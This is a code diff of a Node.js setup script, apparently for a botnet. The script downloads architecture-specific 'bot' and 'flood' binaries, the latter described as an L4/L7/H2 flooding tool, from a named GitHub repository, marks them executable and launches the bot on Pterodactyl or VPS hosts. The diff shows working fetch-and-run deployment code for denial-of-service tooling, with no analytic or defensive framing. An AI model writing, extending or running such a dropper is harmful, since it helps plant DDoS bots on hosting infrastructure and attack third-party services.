@@ -1,21 +1,31 @@
 /**
  * Bot Setup Script - Pure Node.js (Pterodactyl & VPS Compatible)
- * Downloads bot + flood (all-in-one: L4/L7/H2) binaries and agent.txt
- * from GitHub repository, sets executable permissions, and launches bot.
+ * Downloads fully-static bot + flood (musl, TLS-enabled) binaries for
+ * the detected architecture and agent.txt, then launches the bot.
  */
 
 const https = require('https');
 const http  = require('http');
+const os    = require('os');
 const fs    = require('fs');
 const path  = require('path');
 const { spawn } = require('child_process');
 
 const REPO_BASE = 'https://raw.githubusercontent.com/risalmuhammd66-byte/agent/main';
 
+const ARCH_MAP = {
+    x64:   'x86_64',
+    arm64: 'aarch64',
+    arm:   'armv7l',
+    ia32:  'x86',
+};
+
+const binArch = ARCH_MAP[os.arch()] || 'x86_64';
+
 const FILES_TO_DOWNLOAD = [
-    { url: `${REPO_BASE}/bots/bot`,       filename: 'bot',       executable: true  },
-    { url: `${REPO_BASE}/bots/flood`,     filename: 'flood',     executable: true  },
-    { url: `${REPO_BASE}/agent.txt`,      filename: 'agent.txt', executable: false },
+    { url: `${REPO_BASE}/bots/bot-${binArch}`,   filename: 'bot',       executable: true },
+    { url: `${REPO_BASE}/methods_cpp/flood-${binArch}`, filename: 'flood', executable: true  },
+    { url: `${REPO_BASE}/agent.txt`,             filename: 'agent.txt', executable: false },
 ];
 
 function download(url, destPath) {
@@ -42,6 +52,7 @@ function download(url, destPath) {
 async function setup() {
     const targetDir = process.cwd();
     console.log(`[+] Setting up Bot in: ${targetDir}`);
+    console.log(`[+] Platform: ${os.platform()} arch: ${os.arch()} (using ${binArch} binaries)`);
 
     for (const item of FILES_TO_DOWNLOAD) {
         const dest = path.join(targetDir, item.filename);
